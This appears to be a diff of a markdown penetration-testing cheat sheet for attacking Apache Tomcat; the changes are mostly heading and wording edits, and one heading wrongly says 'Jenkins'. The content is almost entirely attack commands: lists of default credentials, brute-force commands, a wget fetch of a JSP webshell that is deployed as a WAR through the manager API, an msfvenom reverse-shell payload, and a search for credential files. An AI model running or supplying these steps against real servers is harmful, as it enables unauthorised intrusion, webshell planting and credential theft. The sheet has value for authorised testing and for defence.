@@ -1,18 +1,18 @@
-### **INTRODUCTION**
+### **Introduction**
 
 Apache Tomcat is an open-source Java servlet container and web server, it's a key target due to its role in hosting Java-based web applications, often presenting opportunities to exploit configuration flaws and known vulnerabilities.
 
-### **IDENTIFYING JENKINS VERSION**
+### **Identifying Jenkins Version**
 
-1.  Check Version in Documentation page:  
+1.  Check version in documentation page:  
     `curl -s http://[TOMCAT-DOMAIN]:8080/docs/ | grep Tomcat`
-2.  Obtain Version from Default Error page:  
+2.  Obtain version from default error page:  
     `curl -s http://[TOMCAT-DOMAIN]:8080/nonexistentpage | grep -i tomcat`
-3.  Obtain Version Using Nmap:  
+3.  Obtain version using Nmap:  
     `nmap -p 8080 --script http-server-header [TOMCAT-DOMAIN]`
     
 
-### **DIRECTORY DISCOVERY**
+### **Directory Discovery**
 
 1.  Directory Fuzzing with FFUF:  
     `ffuf -u https://[TOMCAT-DOMAIN]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt`
@@ -22,7 +22,7 @@ Apache Tomcat is an open-source Java servlet container and web server, it's a ke
     `wfuzz -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt https://[TOMCAT-DOMAIN]/FUZZ`
     
 
-### **DEFAULT CREDENTIALS**
+### **Default Credentials**
 
 1.  `admin`:`admin`
 2.  `tomcat`:`tomcat`
@@ -31,7 +31,7 @@ Apache Tomcat is an open-source Java servlet container and web server, it's a ke
 5.  `tomcat`:`s3cr3t`
 6.  `admin`:`tomcat`
 
-### **BRUTE-FORCE APACHE TOMCAT CREDENTIALS**
+### **Brute-Force Apache Tomcat Credentials**
 
 1.  Credential Brute-Forcing with Metasploit:  
     `use auxiliary/scanner/http/tomcat_mgr_login`
@@ -40,11 +40,11 @@ Apache Tomcat is an open-source Java servlet container and web server, it's a ke
 3.  Credential Brute-Forcing with Nmap:  
     `nmap -p 8080 --script http-brute --script-args http-brute.path=/manager/html,userdb=userlist.txt,passdb=passlist.txt [TOMCAT-URL]`
 
-### **REMOTE CODE EXECUTION (RCE)**
+### **Remote Code Execution (RCE)**
 
-1.  Downloading JSP Shell Using wget:  
+1.  Download JSP shell using wget:  
     `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp`
-2.  Place cmd.jsp in a apart Directory and Create a WAR File  
+2.  Package shell into WAR file  
     `jar -cvf MyShell.war *`
 3.  Upload the MyShell.war to Tomcat using either the manager GUI or a tool like curl:  
     `curl -u admin:password -T MyShell.war http://[TOMCAT-DOMAIN]:8080/manager/text/deploy?path=/myshell`
@@ -52,11 +52,11 @@ Apache Tomcat is an open-source Java servlet container and web server, it's a ke
     `http://[TOMCAT-DOMAIN]:8080/myshell/cmd.jsp`
     
 
-### **REVERSE SHELL USING MESTPLOIT**
+### **Reverse Shell Using Metasploit**
 
 1.  Create war File  
     `msfvenom -p windows/shell_reverse_tcp LHOST=[IP-ADRESS] LPORT=9002 -f war > MyShell.war`
-2.  use jar to list the contents of the war.  
+2.  List WAR contents.  
     `jar -ft MyShell.war`
 3.  Upload the MyShell.war to Tomcat using either the manager GUI or a tool like curl:  
     `curl -u admin:password -T MyShell.war http://[TOMCAT-DOMAIN]:8080/manager/text/deploy?path=/myshell`
@@ -65,9 +65,9 @@ Apache Tomcat is an open-source Java servlet container and web server, it's a ke
 5.  trigger reverse shell using curl  
     `curl http://[TOMCAT-DOMAIN]:8080/myshell/orkmagcvdm.jsp`
 
-### **USING METASPLOIT**
+### **Using Metasploit**
 
-1.  Open Metasploit Framework:  
+1.  Start Metasploit Framework:  
     `msfconsole`
 2.  Select the Tomcat RCE exploit module:  
     `msf> use exploit/multi/http/tomcat_mgr_upload`
@@ -80,7 +80,7 @@ Apache Tomcat is an open-source Java servlet container and web server, it's a ke
 6.  Accessing the Shell:  
     `https://[TOMCAT-DOMAIN]/shell`
 
-### **POST EXPLOIT**
+### **Post Exploit**
 
 1.  Find Tomcat credentials in tomcat-users.xml:  
     `find / -name tomcat-users.xml 2>/dev/null`
